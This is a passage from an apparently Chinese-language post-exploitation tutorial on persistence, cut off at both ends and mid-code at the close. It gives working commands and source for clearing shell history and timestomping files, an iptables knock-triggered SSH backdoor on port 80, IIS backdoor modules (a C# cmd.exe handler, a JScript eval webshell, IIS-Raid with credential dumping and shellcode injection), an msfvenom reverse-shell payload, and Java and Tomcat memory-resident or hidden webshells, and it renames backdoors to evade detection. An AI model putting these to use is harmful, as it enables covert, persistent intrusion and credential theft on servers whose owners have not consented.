/etc/ssh/ssh_config\n&gt;touch -r/etc/ssh/sshd_config.old /etc/ssh/sshd_config\n</code></pre>\n<p><img data-src=\"578.png\" alt=\"\" /><br />\n<img data-src=\"579.png\" alt=\"\" /></p>\n<pre><code>清除痕迹\n&gt;export HISTFILE=/dev/null\n&gt;export HISTSIZE=0\n&gt;export HISTFILESIZE=0\n&gt;sed -i 's/192.168.0.1/127.0.0.1/g' /root/.bash_history\n</code></pre>\n<h3 id=\"iptables端口复用\"><a class=\"anchor\" href=\"#iptables端口复用\">#</a> IPTables 端口复用</h3>\n<pre><code>&gt;iptables -t nat -N LETMEIN \n&gt;iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22\n# 开启开关\n&gt;iptables -A INPUT -p tcp -m string --string 'threathuntercoming' --algo bm -m recent --set --name letmein --rsource -j ACCEPT\n# 关闭开关\n&gt;iptables -A INPUT -p tcp -m string --string 'threathunterleaving' --algo bm -m recent --name letmein --remove -j ACCEPT\n&gt;iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN\n攻击端：\n#开启复用\n&gt;echo threathuntercoming | socat - tcp:192.168.0.110:80\n#ssh使用80端口进行登录\nssh -p 80 root@192.168.0.110\n#关闭复用\necho threathunterleaving | socat - tcp:192.168.0.110:80\n</code></pre>\n<p><img data-src=\"580.png\" alt=\"\" /></p>\n<h3 id=\"文件处理\"><a class=\"anchor\" href=\"#文件处理\">#</a> 文件处理</h3>\n<pre><code>&gt;chattr +I shell.sh\n</code></pre>\n<p><img data-src=\"581.png\" alt=\"\" /></p>\n<pre><code>&gt;vim .shell.sh\n</code></pre>\n<p><img data-src=\"582.png\" alt=\"\" /></p>\n<pre><code>&gt;attrib +s +h +r 1.txt\n</code></pre>\n<p><img data-src=\"583.png\" alt=\"\" /></p>\n<pre><code>&gt;touch -r 1.file 2.file 修改2file文件的时间跟1file时间相同\n</code></pre>\n<h3 id=\"iis_bin_backdoor\"><a class=\"anchor\" href=\"#iis_bin_backdoor\">#</a> IIS_Bin_Backdoor</h3>\n<pre><code>From:https://github.com/WBGlIl/IIS_backdoor\nIIS_backdoor_dll.dl放入 web 目录的 bin 文件夹中配置 web.config 文件\n</code></pre>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>configuration</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>system.webServer</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>modules</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>add</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>IIS_backdoor<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>IIS_backdoor_dll.IISModule<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>modules</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>system.webServer</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>configuration</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><pre><code>IIS_backdoor_shell.exe执行命令\n</code></pre>\n<p><img data-src=\"584.png\" alt=\"\" /></p>\n<pre><code>使用IISBackdoor太明显，容易被看出是后门，这里对后门改名\n</code></pre>\n<p><img data-src=\"585.png\" alt=\"\" /><br />\n<img data-src=\"586.png\" alt=\"\" /><br />\n<img data-src=\"587.png\" alt=\"\" /></p>\n<pre><code>重新生成解决方案，dll放入bin目录，web.config修改为\n</code></pre>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>configuration</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>system.webServer</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>modules</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      \t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>add</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>UrlRoutingModule<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>UrlRoutingModule.IISModule<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>modules</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>system.webServer</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>configuration</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><pre><code>添加完之后会自动在模块中注册好\n</code></pre>\n<p><img data-src=\"588.png\" alt=\"\" /></p>\n<pre><code>执行payload，msf生成raw格式payload，选择shellcode选项，raw文件拖入即可\n&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f raw -o /var/www/html/1.raw\n</code></pre>\n<p><img data-src=\"589.png\" alt=\"\" /></p>\n<h3 id=\"iis_netdll_spy\"><a class=\"anchor\" href=\"#iis_netdll_spy\">#</a> IIS_NETDLL_Spy</h3>\n<pre><code>From:https://github.com/Ivan1ee/NetDLLSpy\n原作者提及三种方式，第一种编译代码为DLL新建aspx文件实例化后门类来执行命令，第二种是做httphandler映射可指定一个后缀执行命令保存文件在web服务器上，再读取结果。第三种是使用jsc.exe编译js脚本生成dll，添加映射菜刀连接。\n这里根据原作者的代码，进行了一下简单的修改，修改后的功能为添加httphandler映射指定一个后缀执行命令显示在页面上，不用保存在服务器中再访问。\n代码\n</code></pre>\n<figure class=\"highlight csharp\"><figcaption data-lang=\"C#\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Diagnostics</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>IO</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Text</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token namespace\">System<span class=\"token punctuation\">.</span>Web</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">namespace</span> <span class=\"token namespace\">IsapiModules</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Handler</span> <span class=\"token punctuation\">:</span> <span class=\"token type-list\"><span class=\"token class-name\">IHttpHandler</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t<span class=\"token keyword\">public</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">bool</span></span> IsReusable</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\t<span class=\"token keyword\">get</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token keyword\">public</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">ProcessRequest</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpContext</span> context<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t\t<span class=\"token class-name\"><span class=\"token keyword\">string</span></span> input <span class=\"token operator\">=</span> context<span class=\"token punctuation\">.</span>Request<span class=\"token punctuation\">.</span>Form<span class=\"token punctuation\">[</span><span class=\"token string\">\"InternetInformationService\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//command</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">.</span>Request<span class=\"token punctuation\">.</span>Form<span class=\"token punctuation\">[</span><span class=\"token string\">\"microsoft\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">\"iis\"</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//do command</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\t\t\t<span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span><span class=\"token function\">cmdShell</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t<span class=\"token keyword\">public</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">void</span></span> <span class=\"token function\">cmdShell</span><span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token keyword\">string</span></span> input<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t\t<span class=\"token class-name\">Process</span> process <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token constructor-invocation class-name\">Process</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t\tprocess<span class=\"token punctuation\">.</span>StartInfo<span class=\"token punctuation\">.</span>FileName <span class=\"token operator\">=</span> <span class=\"token string\">\"cmd.exe\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t\tprocess<span class=\"token punctuation\">.</span>StartInfo<span class=\"token punctuation\">.</span>RedirectStandardOutput <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\t\tprocess<span class=\"token punctuation\">.</span>StartInfo<span class=\"token punctuation\">.</span>UseShellExecute <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t\tprocess<span class=\"token punctuation\">.</span>StartInfo<span class=\"token punctuation\">.</span>Arguments <span class=\"token operator\">=</span> <span class=\"token string\">\"/c \"</span> <span class=\"token operator\">+</span> input<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t\tprocess<span class=\"token punctuation\">.</span>StartInfo<span class=\"token punctuation\">.</span>WindowStyle <span class=\"token operator\">=</span> ProcessWindowStyle<span class=\"token punctuation\">.</span>Hidden<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t\tprocess<span class=\"token punctuation\">.</span><span class=\"token function\">Start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t\t\t<span class=\"token class-name\">StreamReader</span> output <span class=\"token operator\">=</span> process<span class=\"token punctuation\">.</span>StandardOutput<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t\t<span class=\"token class-name\">String</span> result <span class=\"token operator\">=</span> output<span class=\"token punctuation\">.</span><span class=\"token function\">ReadToEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t\toutput<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t\toutput<span class=\"token punctuation\">.</span><span class=\"token function\">Dispose</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t\t\tHttpContext<span class=\"token punctuation\">.</span>Current<span class=\"token punctuation\">.</span>Response<span class=\"token punctuation\">.</span><span class=\"token function\">Write</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><pre><code>保存为随意后缀，使用csc编译。\n&gt;C:\\Windows\\Microsoft.NET\\Framework\\v2.50727\\csc.exe /t:library /r:System.Web.dll -out:C:\\inetpub\\wwwroot\\Bin\\SystemIO.dll C:\\inetpub\\wwwroot\\bin\\code.cs\n</code></pre>\n<p><img data-src=\"590.png\" alt=\"\" /></p>\n<pre><code>Web.config文件添加\n&lt;system.webServer&gt;\n\t&lt;handlers&gt; \n\t\t&lt;add name=&quot;PageHandlerFactory-ISAPI-2.0-32&quot; path=&quot;*.xxx&quot; verb=&quot;*&quot; type=&quot;IsapiModules.Handler&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Script&quot; preCondition=&quot;integratedMode&quot; /&gt; \n\t&lt;/handlers&gt; \n&lt;/system.webServer&gt;\n</code></pre>\n<p><img data-src=\"001.png\" alt=\"\" /></p>\n<pre><code>打开IIS管理器，可以看到处理映射管理器中已经添加了模块。\n</code></pre>\n<p><img data-src=\"591.png\" alt=\"\" /></p>\n<pre><code>现在随意访问个xxx后缀的文件\n</code></pre>\n<p><img data-src=\"592.png\" alt=\"\" /></p>\n<pre><code>带参数访问\nmicrosoft=iis&amp;InternetInformationService=net user\n</code></pre>\n<p><img data-src=\"593.png\" alt=\"\" /><br />\n<img data-src=\"594.png\" alt=\"\" /></p>\n<pre><code>第三种连接菜刀，这里也对代码修改了一下。\n</code></pre>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> System<span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> System<span class=\"token punctuation\">.</span>Web<span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> System<span class=\"token punctuation\">.</span><span class=\"token constant\">IO</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">package</span> IsapiModule</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Handler</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">IHttpHandler</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token keyword\">function</span> IHttpHandler<span class=\"token punctuation\">.</span><span class=\"token function\">ProcessRequest</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">context <span class=\"token operator\">:</span> HttpContext</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\tcontext<span class=\"token punctuation\">.</span>Response<span class=\"token punctuation\">.</span><span class=\"token function\">Write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"404 Not Found\"</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t<span class=\"token keyword\">var</span> <span class=\"token constant\">I</span> <span class=\"token operator\">=</span> context<span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\t<span class=\"token keyword\">var</span> Request <span class=\"token operator\">=</span> <span class=\"token constant\">I</span><span class=\"token punctuation\">.</span>Request<span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\t<span class=\"token keyword\">var</span> Response <span class=\"token operator\">=</span> <span class=\"token constant\">I</span><span class=\"token punctuation\">.</span>Response<span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token keyword\">var</span> Server <span class=\"token operator\">=</span> <span class=\"token constant\">I</span><span class=\"token punctuation\">.</span>Server<span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t\t<span class=\"token function\">eval</span><span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">.</span>Request<span class=\"token punctuation\">[</span><span class=\"token string\">\"Internet\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//pass</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token keyword\">function</span> <span class=\"token keyword\">get</span> IHttpHandler<span class=\"token punctuation\">.</span><span class=\"token function\">IsReusable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> Boolean<span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><pre><code>使用jsc编译\n&gt;C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\jsc.exe /t:library -out:C:\\inetpub\\wwwroot\\Bin\\IsapiModule.Handler.dll C:\\inetpub\\wwwroot\\bin\\code.js\n</code></pre>\n<p><img data-src=\"595.png\" alt=\"\" /></p>\n<pre><code>编辑web.config，添加映射，这里指定的后缀是.iis\n&lt;system.webServer&gt; \n&lt;modules runAllManagedModulesForAllRequests=&quot;true&quot;/&gt; &lt;directoryBrowse enabled=&quot;true&quot;/&gt;\n&lt;staticContent&gt;\n &lt;mimeMap fileExtension=&quot;.json&quot; mimeType=&quot;application/json&quot; /&gt; \n &lt;/staticContent&gt; \n&lt;handlers&gt;\n &lt;add name=&quot;PageHandlerFactory-ISAPI-2.0-32-1&quot; path=&quot;*.iis&quot; verb=&quot;*&quot; type=&quot;IsapiModule.Handler&quot; preCondition=&quot;integratedMode&quot;/&gt;\n &lt;/handlers&gt;\n&lt;/system.webServer&gt;\n已自动加入了映射。现在随便访问个iis后缀的文件。\n</code></pre>\n<p><img data-src=\"596.png\" alt=\"\" /><br />\n<img data-src=\"597.png\" alt=\"\" /></p>\n<pre><code>可使用菜刀直接连接\n</code></pre>\n<p><img data-src=\"598.png\" alt=\"\" /><br />\n<img data-src=\"599.png\" alt=\"\" /></p>\n<h3 id=\"iis_raid\"><a class=\"anchor\" href=\"#iis_raid\">#</a> IIS_RAID</h3>\n<pre><code>From:https://github.com/0x09AL/IIS-Raid\n在vs2019下编译\n在Functions.h中修改连接密码，passfile是dump下来的密码保存的位置，com_header是后门和服务器通信的请求头。\n</code></pre>\n<p><img data-src=\"600.png\" alt=\"\" /></p>\n<pre><code>打开项目修改完你的密码，直接ctrl+B生成解决方案即可(这里生成的是release版本)\nDll传到服务器，改个名字，执行添加模块\n&gt;C:\\Windows\\system32\\inetsrv\\APPCMD.EXE install module /name:IsapiDotNet /image:&quot;c:\\windows\\system32\\inetsrv\\IsapiDotNet.dll&quot; /add:true\n</code></pre>\n<p><img data-src=\"601.png\" alt=\"\" /></p>\n<pre><code>在模块中可以看到已经存在了\n</code></pre>\n<p><img data-src=\"602.png\" alt=\"\" /></p>\n<pre><code>远程连接\n&gt;python3 iis_controller.py --url http://192.168.0.98 --password thisismykey\n执行命令的方式是\n&gt;cmd +命令\n</code></pre>\n<p><img data-src=\"603.png\" alt=\"\" /></p>\n<pre><code>Dump命令可以dump下来IIS站点的登录的信息，保存在设置的位置。\nInject可以执行shellcode\nCs/msf生成raw格式的shellcode\n&gt;inject 位置\n</code></pre>\n<p><img data-src=\"604.png\" alt=\"\" /></p>\n<h3 id=\"java-web-backdoor\"><a class=\"anchor\" href=\"#java-web-backdoor\">#</a> JAVA Web Backdoor</h3>\n<pre><code>From:https://www.freebuf.com/articles/web/172753.html\nhttps://github.com/rebeyond/memShell\n当获取一个webshell或bashshell权限时，下载后门执行注入进程形成无文件复活后门\n下载后解压到任意web目录\n</code></pre>\n<p><img data-src=\"605.png\" alt=\"\" /></p>\n<pre><code>得到2个jar文件\n执行，password设置为你的密码\n&gt;java -jar inject.jar password\n</code></pre>\n<p><img data-src=\"606.png\" alt=\"\" /></p>\n<pre><code>注入成功，在web任意页面任意url执行命令\nhttp://192.168.0.121:8080/css/app.css?pass_the_world=password\n</code></pre>\n<p><img data-src=\"607.png\" alt=\"\" /></p>\n<pre><code>可执行命令，反弹shell，上传/下载文件，列目录，读文件，添加代理，连接菜刀\n</code></pre>\n<p><img data-src=\"608.png\" alt=\"\" /></p>\n<h3 id=\"tomcat-jsp-hideshell\"><a class=\"anchor\" href=\"#tomcat-jsp-hideshell\">#</a> Tomcat JSP HideShell</h3>\n<pre><code>From:https://mp.weixin.qq.com/s/7b3Fyu_K6ZRgKlp6RkdYoA\nhttps://github.com/QAX-A-Team/HideShell\n把自己的shell和hideshell传入靶机，先访问自己的shell，目的是为了让 Tomcat 将它编译，并生成 JspServletWrapper 保存在 JspRuntimeContext 中。\n</code></pre>\n<p><img data-src=\"609.png\" alt=\"\" /></p>\n<pre><code>再访问hideshell.jsp，点击hide你的shell。\n</code></pre>\n<p><img data-src=\"610.png\" alt=\"\" /></p>\n<pre><code>已经隐藏了\n</code></pre>\n<p><img data-src=\"611.png\" alt=\"\" /><br />\n<img data-src=\"612.png\" alt=\"\" /></p>\n<pre><code>再访问hideshell.jsp，可以看到隐藏后的shell的文件名。\n</code></pre>\n<p><img data-src=\"613.png\" alt=\"\" /></p>\n<pre><code>访问看看\n</code></pre>\n<p><img data-src=\"614.png\" alt=\"\" /></p>\n<pre><code>当然，也可以把hideshell自身隐藏了，那访问它的方式就是hidden-hideshell.jsp\n</code></pre>\n<p><img data-src=\"615.png\" alt=\"\" /></p>\n<pre><code>目录里啥都没了\n</code></pre>\n<p><img data-src=\"616.png\" alt=\"\" /></p>\n<pre><code>此方式隐藏之后请求不会产生日志\n</code></pre>\n<p><img data-src=\"617.png\" alt=\"\" /></p>\n<pre><code>那如果把shelltest文件夹删掉权限还会在吗？\n</code></pre>\n<p><img data-src=\"618.png\" alt=\"\" /></p>\n<pre><code>是在的\n</code></pre>\n<p><img data-src=\"619.png\" alt=\"\" /></p>\n<h3 id=\"apache-module后门1\"><a class=\"anchor\" href=\"#apache-module后门1\">#</a> Apache Module 后门 1</h3>\n<pre><code>From:https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor\n生成模板结构\n&gt;apxs -g -n auth\n</code></pre>\n<p><img data-src=\"620.png\" alt=\"\" /></p>\n<pre><code>编辑mod_auth.c文件\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"httpd.h\"</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"http_config.h\"</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"http_protocol.h\"</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"ap_config.h\"</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> <span class=\"token function\">auth_handler</span><span class=\"token punctuation\">(</span>request_rec <span class=\"token operator\">*</span>r<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">const</span> <span class=\"token class-name\">apr_array_header_t</span>    <span class=\"token operator\">*</span>fields<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">int</span>                            i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token class-name\">apr_table_entry_t</span>           <span class=\"token operator\">*</span>e <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">char</span> FLAG <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    fields <span class=\"token operator\">=</span> <span class=\"token function\">apr_table_elts</span><span class=\"token punctuation\">(</span>r<span class=\"token operator\">-></span>headers_in<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    e <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">apr_table_entry_t</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> fields<span class=\"token operator\">-></span>elts<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">for</span><span 